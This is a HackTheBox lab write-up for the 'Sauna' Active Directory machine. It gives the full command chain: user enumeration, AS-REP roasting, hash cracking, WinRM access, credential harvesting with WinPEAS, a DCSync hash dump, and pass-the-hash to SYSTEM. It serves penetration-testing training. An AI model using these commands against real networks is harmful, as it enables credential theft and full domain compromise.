# Sauna

**By Stager** | FashilHack

---

## What is this machine

Sauna is an easy Windows Active Directory box on HackTheBox. It teaches one of the most important AD attack techniques — AS-REP Roasting — combined with finding credentials through automated enumeration tools like WinPEAS and following BloodHound paths to DCSync.

The foothold comes from a name you find on a website. Everything else flows from there.

---

## Target

```
IP:     10.10.10.175
OS:     Windows Server (Active Directory)
Domain: egotistical-bank.local
```

---

## Step 1 — Nmap Scan

```bash
nmap -A -p- -T5 -Pn 10.10.10.175 -v
```

Key findings:

| Port | Service | Detail |
|---|---|---|
| 53 | DNS | Domain DNS |
| 80 | HTTP | Web server |
| 88 | Kerberos | AD authentication |
| 135 | RPC | Remote Procedure Call |
| 389 | LDAP | Directory services |
| 445 | SMB | File sharing |
| 5985 | WinRM | Remote management |

Domain Controller confirmed. Web server on port 80 noted — worth checking for employee names.

![Nmap Results](./images/nmap.png)

---

## Step 2 — Web Enumeration

Ran gobuster/dirb against the web server:

```bash
dirb http://10.10.10.175
```

Browsed the site manually. Found an employee/team page listing staff names. Noted: **Hugo Smith**, **Fergus Smith**, **Steven Kerb**, **Shaun Coins**, **Bowie Taylor**, **Sophie Driver**.

Also checked HTML comments in the page source — names or usernames sometimes get left in comments during development.

Saved the names to `names.txt`.

![Employee Names Found](./images/website-names.png)

---

## Step 3 — Anonymous Enumeration

Checked all anonymous access paths before touching anything that needs credentials.

**SMB:**
```bash
netexec smb 10.10.10.175 -u "" -p "" --shares
netexec smb 10.10.10.175 -u "" -p "" --rid-brute
netexec smb 10.10.10.175 -u "guest" -p "" --rid-brute
```

**LDAP:**
```bash
netexec ldap 10.10.10.175 -u "" -p "" --users
nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.175
```

**RPC:**
```bash
rpcclient -U "" -N 10.10.10.175
enumdomusers
```

**enum4linux:**
```bash
enum4linux -a 10.10.10.175
```

**DNS:**
```bash
dnsrecon -d egotistical-bank.local -n 10.10.10.175
dig egotistical-bank.local @10.10.10.175 axfr
```

Nothing major from anonymous access. Moved to username generation.

![Anonymous Enumeration](./images/anon-enum.png)

---

## Step 4 — Username Generation and Validation

Converted the employee names into possible username formats:

```bash
username-anarchy -i names.txt > generated_users.txt
```

Validated which usernames actually exist in the domain using kerbrute:

```bash
kerbrute userenum generated_users.txt --dc 10.10.10.175 -d egotistical-bank.local
```

Got valid usernames confirmed. `fsmith` (Fergus Smith) came back as valid.

![Kerbrute Validation](./images/kerbrute.png)

---

## Step 5 — AS-REP Roasting

With a valid username tried AS-REP Roasting — requesting a TGT without providing a password. Works when pre-authentication is disabled on the account:

```bash
impacket-GetNPUsers -dc-ip 10.10.10.175 egotistical-bank.local/fsmith -no-pass
```

Got a hash back. Saved it to hash.txt.

If the above doesn't work add the domain to `/etc/hosts` first and retry.

![AS-REP Hash](./images/asrep.png)

---

## Step 6 — Cracking the Hash

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked. Got the plaintext password for fsmith.

![Hashcat Cracked](./images/hashcat.png)

---

## Step 7 — Shell via Evil-WinRM

WinRM was open on port 5985. Logged in:

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'foundpassword'
```

Shell obtained as fsmith. Got user.txt.

![Evil-WinRM Shell](./images/winrm-shell.png)

---

## Step 8 — WinPEAS Enumeration

Uploaded WinPEAS to the target using Evil-WinRM's built-in upload:

```bash
upload winpeas.exe
.\winpeas.exe
```

WinPEAS found **AutoLogon credentials** stored in the registry — a username and plaintext password for another account (`svc_loanmanager`) sitting in Windows AutoLogon settings.

![WinPEAS AutoLogon](./images/winpeas-autologon.png)

---

## Step 9 — BloodHound Collection

Downloaded SharpHound to the target and ran it:

```bash
upload SharpHound.exe
.\SharpHound.exe
download 20231028_BloodHound.zip
```

On Kali started neo4j and BloodHound:

```bash
sudo neo4j console
bloodhound
```

Uploaded the zip. Marked fsmith and svc_loanmanager as owned.

Ran the query **Find Principals with DCSync Rights** — found that `svc_loanmanager` had DCSync rights on the domain.

![BloodHound DCSync Path](./images/bloodhound-dcsync.png)

---

## Step 10 — DCSync Attack

With svc_loanmanager's credentials ran secretsdump to pull all domain hashes:

```bash
impacket-secretsdump egotistical-bank.local/svc_loanmanager@10.10.10.175
```

If that syntax fails try:

```bash
impacket-secretsdump 'svc_loanmanager:password@10.10.10.175'
```

Dumped all NTLM hashes including Administrator.

![Secretsdump Output](./images/secretsdump.png)

---

## Step 11 — Pass the Hash as Administrator

```bash
impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
```

Note: psexec expects the hash in `LM:NTLM` format. The LM part (`aad3b435...`) is the empty LM hash used as a placeholder. Put your actual NTLM hash after the colon.

Got SYSTEM shell. Read root.txt.

![SYSTEM Shell](./images/system-shell.png)

---

## The Full Chain

```
Nmap → DC confirmed, web server found
  ↓
Website → employee names scraped
  ↓
username-anarchy → username formats generated
  ↓
kerbrute → fsmith confirmed as valid user
  ↓
impacket-GetNPUsers → AS-REP hash for fsmith
  ↓
hashcat → password cracked
  ↓
evil-winrm → shell as fsmith → user.txt
  ↓
WinPEAS → AutoLogon credentials → svc_loanmanager
  ↓
SharpHound → BloodHound → svc_loanmanager has DCSync rights
  ↓
secretsdump → all domain hashes dumped
  ↓
Pass-the-Hash → psexec → SYSTEM
  ↓
root.txt
```

---

## What I learned from this one

**Employee names on websites are always worth collecting.** The entire foothold started with a name on a team page. Always check the about/team/employees section of any web app.

**username-anarchy saves time guessing formats.** Companies use patterns — f.smith, fsmith, fergus.smith. The tool generates all of them so kerbrute can find the right one.

**Kerbrute validates AND roasts simultaneously.** One command confirms which users exist and checks for pre-auth disabled accounts at the same time.

**AS-REP Roasting needs zero credentials.** If pre-auth is disabled you get a crackable hash with no authentication whatsoever. Always check for it when you have valid usernames.

**WinPEAS AutoLogon is a gold mine.** When admins configure Windows to auto-login they store credentials in the registry in cleartext. WinPEAS surfaces these immediately in its output — look for the AutoLogon section.

**BloodHound's DCSync query goes straight to the answer.** Instead of manually tracing paths, the "Find Principals with DCSync Rights" query immediately shows which accounts can dump the whole domain.

**Pass-the-Hash format for psexec is LM:NTLM.** The LM part is always `aad3b435b51404eeaad3b435b51404ee` when LM hashing is disabled (which it almost always is on modern Windows). Your actual hash goes after the colon.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._